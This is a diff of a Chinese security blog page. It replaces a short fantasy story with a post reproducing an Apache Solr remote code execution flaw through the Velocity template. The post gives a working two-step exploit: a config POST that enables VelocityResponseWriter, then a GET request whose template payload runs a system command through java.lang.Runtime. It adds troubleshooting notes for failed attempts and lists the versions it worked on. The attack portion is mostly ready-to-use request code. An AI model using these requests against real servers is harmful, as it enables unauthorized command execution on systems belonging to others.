@@ -6,20 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://geeeez.github.io">
-  <title>捕风人 | geez博客</title>
+  <title>Apache solr RCE（CVE-2019-xxxx） | geez博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="捕风人">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="捕风人">
-<meta property="og:url" content="https://geeeez.github.io/2020/02/06/捕风人/index.html">
+<meta property="og:title" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta property="og:url" content="https://geeeez.github.io/2019/10/31/Apache-solr 命令执行/index.html">
 <meta property="og:site_name" content="geez博客">
-<meta property="og:description" content="捕风人">
+<meta property="og:description" content="Apache solr RCE（CVE-2019-xxxx）">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-04-17T08:35:03.584Z">
+<meta property="og:image" content="https://geeeez.github.io/images/1572506935286.png">
+<meta property="og:image" content="https://geeeez.github.io/images/1572507215924.png">
+<meta property="og:updated_time" content="2019-12-02T15:08:23.047Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="捕风人">
-<meta name="twitter:description" content="捕风人">
+<meta name="twitter:title" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta name="twitter:description" content="Apache solr RCE（CVE-2019-xxxx）">
+<meta name="twitter:image" content="https://geeeez.github.io/images/1572506935286.png">
   
     <link rel="alternative" href="/atom.xml" title="geez博客" type="application/atom+xml">
   
@@ -177,27 +180,39 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-捕风人" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Apache-solr 命令执行" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      捕风人
+      Apache solr RCE（CVE-2019-xxxx）
     </h1>
   
 
         
-        <a href="/2020/02/06/捕风人/" class="archive-article-date">
-  	<time datetime="2020-02-06T12:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-06</time>
+        <a href="/2019/10/31/Apache-solr 命令执行/" class="archive-article-date">
+  	<time datetime="2019-10-31T15:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>&nbsp;&nbsp;&nbsp;&nbsp;我生活在极度国，这是一个与众不同的国度，这里的一切都和你们的世界都不一样。我们这里是一望无际的冬天，寒冷、黑暗、最难受的是冰封的无聊和寂寞。更不幸的是我们国度的人生来就不会说话，就是你们说的“哑巴”。所以我也只能靠文字来讲述我们这里的故事。<br>&nbsp;&nbsp;&nbsp;&nbsp;我们这里大多数的人以捕风为生，当然我们国度的风是要不得的，只有远走他乡，去捕那异国他乡的温暖的春风。异国他乡的风也不是都能捕回来卖，因为冬天的风太疼，夏天的风太烫，秋天的风太悲，只有春天，对！只有春天，我们的这里的捕风人才会在异国他乡的各个街道冒出来，他们忙忙碌碌，只是想把这温暖的风装进口袋，贩卖给那些见不到春天的地方。<br>&nbsp;&nbsp;&nbsp;&nbsp;他们拿着大口袋，一次抓好多的风，系紧口袋，这就成了一件商品，包装对于这种商品也是必不可少的，只有拿着透明口袋装好的风才能卖上好价儿。他们装好一车的风就马不停蹄的赶回来，倘若路程上耽搁时间久了，这风就全跑出来了，那也就白忙活。<br>&nbsp;&nbsp;&nbsp;&nbsp;买卖的集市也是一个异常寒冷的地方，总之我们的国度就只有冬。而且这个集市不同于一般的集市，竟交易一些稀奇古怪的玩意儿，有仇人的诅咒、亲人的问候、儿女的埋怨、恶言恶语、爱人的呢喃和异国他乡都市的噪音等等等等，我最喜欢还是一种叫“噪音”的进口产品，买一袋回家，白天百无聊赖的时候，撕开”噪音“的包装袋，只要一点点的口子，用点风吹出来，能解很多寂寥。当然这是我这种年轻人的喜好。像我爷爷那老一辈的人更喜欢买点“问候”，小心翼翼的拿到家，他们可不敢用风一气吹完，要省着点用，抠门已经印刻到他们的骨子里去了。至于我的父母，他们忙着赚钱，是爱情罐头工厂的工人，他们把一句一句的情话和风装到罐头里，你别说，这种商品还挺好卖，因为年轻人可等不及那些麻烦的步骤，情话这种东西，就是要马上听到耳朵里的。写到这儿你可能就知道了这风的用处，风是这个集市上一切其他商品的载体，相当于你们眼里的能源吧。<br>&nbsp;&nbsp;&nbsp;&nbsp;但是它又和能源不同，只有和煦温暖的春风才有人要，要是“问候”就着冬风啊，那话可没法听，哈哈，这算是一个玩笑。集市上有一种非常紧俏且昂贵的商品叫做“话”，只有非常非常非常有钱的人才能买的起，而且还限量，我这种穷光蛋当然没用过，但是据说那种商品可以把文字变成声音，倘若站在高处，凭着大量的春风，可以洗刷凡人的思想，让平民俯首称臣。</p>
+        <p>&#160; &#160; &#160; 记录一下复现过程，防止下次遇见的时候再去翻资料， 首先 Apache Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 Apache solr历史上有众多高危漏洞，为了自己以后遇见直接找到所有漏洞复现方式，先贴个链接： <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt " target="_blank" rel="noopener">apache solr历史漏洞列表</a></p>
+<a id="more"></a>
+
+<h3 id="复现历程"><a href="#复现历程" class="headerlink" title="复现历程"></a>复现历程</h3><p>1、点击core admin 查看部署的应用的路径 （下图应用名就是dovecot）<br><img src="/images/1572506935286.png" alt="1572506935286"></p>
+<p>2、POST 下面更改config的xml 到 /solr/应用名/config（比如：/solr/dovecot/config）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、请求 POC(注意编码问题，和空格问题)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/master_babyartikel_Product_flop/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1572507215924.png" alt="1572507215924"></p>
+<p>目前测试了 7.1 7.4 8.1 都可成功执行代码。</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>注意：</strong>1、如果第二步修改config响应403则没权限修，此时如果知道账号密码可进一步操作，如果不知道，建议放弃-哈哈。<br>&#160; &#160; &#160; &#160; &#160; 2、如果响应500可能存在的情况就是你的包出现了问题，再次检查请求包是否正确，如果正确则可能是solr的服务损坏。<br>&#160; &#160; &#160; &#160; &#160; 3、如果返回200也别太高兴，看看响应有没有error。没有error即可进行第三步，即命令执行POC。<br>&#160; &#160; &#160; &#160; &#160; 4、第二步成功的情况下，第三步绝大多数都可以成功，但是有的可能会返回xml，400，等一系列不正常的信息，这时候去看一下config - <a href="http://x.x.x.x:8080/solr/应用名/config" target="_blank" rel="noopener">http://x.x.x.x:8080/solr/应用名/config</a> 查看配置是否真的被你在第二步更改了（搜索velocity 看前后是否是你POST修改的josn）。如果没有则重做第二步。</p>
 
       
 
@@ -242,7 +257,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
@@ -298,7 +313,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2020/02/06/捕风人/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://geeeez.github.io/2019/10/31/Apache-solr 命令执行/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -312,18 +327,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/02/11/SSRF的那些事/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/12/25/我的git笔记/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          SSRF的那些问题
+          我的git笔记
         
       </div>
     </a>
   
   
-    <a href="/2019/12/25/我的git笔记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">我的git笔记</div>
+    <a href="/2019/09/29/如何绕过app的ssl-pinning/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">如何绕过app的ssl-pinning</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -350,7 +365,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现历程"><span class="toc-number">1.</span> <span class="toc-text">复现历程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注意事项"><span class="toc-number">2.</span> <span class="toc-text">注意事项</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -489,6 +504,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
@@ -498,10 +517,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">app</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
